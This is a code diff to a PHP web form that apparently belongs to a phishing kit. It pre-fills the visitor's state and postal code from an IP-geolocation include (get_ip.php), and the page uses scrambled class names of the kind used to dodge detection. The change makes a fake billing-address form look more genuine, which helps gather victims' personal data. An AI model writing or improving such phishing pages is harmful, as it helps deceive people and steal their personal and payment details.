@@ -112,17 +112,19 @@ exit;
                                                     <div class="x_31ID-Z518 x_V-ForZ118 large" id="x_30ID-Z577">
                                                         <input type="text" id="city" name="city" value="<?
 														include('../../functions/get_ip.php');
-														echo $_SESSION['_LOOKUP_CITY_'];?>" class="Xval666ideX1 x_27ID-Z668" placeholder="City" required="required" autocomplete="off" value="" aria-required="true">
+														echo $_SESSION['_LOOKUP_CITY_'];?>" class="Xval666ideX1 x_27ID-Z668" placeholder="City" required="required" autocomplete="off" aria-required="true">
                                                     </div>
                                                 </div>
                                             </div>
                                             <div class="x_26ID-Z540 multi x_26ID-Z632 equal x_25ID-Z779 " id="x_24ID-Z554">
                                                 <div class="x_27ID-Z692 x_V-ForZ118 x_23ID-Z714  medium x_24ID-Z626  left" id="x_32ID-Z714">
-                                                    <input type="text" id="state" name="state" autocomplete="off" class="Xval666ideX1 x_27ID-Z523" required="required" aria-required="true" value="" placeholder="State">
+                                                    <input type="text" id="state" name="state" autocomplete="off" class="Xval666ideX1 x_27ID-Z523" required="required" aria-required="true" 
+													value=" <?echo $_SESSION['_LOOKUP_REGION_'];?>" placeholder="State">
                                                 </div>
                                                 <div class="x_26ID-Z561" id="x_29ID-Z731">
                                                     <div class="x_27ID-Z672 x_V-ForZ118 medium x_28ID-Z645  right" id="x_24ID-Z784">
-                                                        <input type="text" id="postalCode" name="zipCode" autocomplete="off" class="Xval666ideX1 x_30ID-Z616" required="required" placeholder="Postal Code" value="" aria-required="true">
+                                                        <input type="text" id="postalCode" name="zipCode" autocomplete="off" class="Xval666ideX1 x_30ID-Z616" required="required" placeholder="Postal Code" value="
+														<?echo $_SESSION['_LOOKUP_ZIPCODE_'];?>" aria-required="true">
                                                     </div>
                                                 </div>
                                             </div>
